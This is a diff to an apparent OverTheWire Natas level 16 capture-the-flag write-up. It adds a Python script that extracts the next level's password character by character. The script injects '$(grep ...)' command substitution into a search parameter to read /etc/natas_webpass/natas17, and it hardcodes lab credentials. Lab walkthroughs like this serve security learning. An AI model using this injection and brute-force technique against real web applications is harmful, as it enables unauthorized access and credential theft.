@@ -377,6 +377,39 @@ To test if it works correctly, let's enumarte the existance of numbers in **/etc
 
 For 0, 1 and 2, it outputed nothing but for 3, it outputed everything. So we know that 0, 1 and 2 exists in the password and 3 does not.
 
-To check the existance of the pattern at the start of the word, we use the symbole **^** as **^abc** will retrun every word that starts with **abc**. And we can add **-i** flag for case sensitivity.
+To check the existance of the pattern at the start of the word, we use the symbole **^** as **^abc** will retrun every word that starts with **abc**.
 
 Now, let's build a script to automate the search.
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+import string
+
+charset = string.ascii_letters + string.digits
+password_length = 32
+password = ""
+
+session = requests.Session()
+session.auth = HTTPBasicAuth("natas16", "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo")
+
+for count in range(1, password_length + 1):
+	found = False
+	for char in charset:
+		payload = f'$(grep ^{password}{char} /etc/natas_webpass/natas17)'
+		url = "http://natas16.natas.labs.overthewire.org/?needle=" + payload + "&submit=Search" # last time it was a POST request. Here, there is no POST methode in the source code and if you check the url after submitting your input, you'll find it in this format. So here we are dealing with GET methode.
+		response = session.get(url)
+		if("African" in response.text): #When we input nothing, the first word that pops up is African so let's use it as a checker
+			print(f"Tried : {char}")
+		else:
+			password = password + char
+			print(f'found a match at position {count} : {password}')
+			found = True
+			break
+	if(found == False):
+		print(f'Stopped: no match at position {count}')
+		break
+print(f'Final password : {password}')
+
+
+```
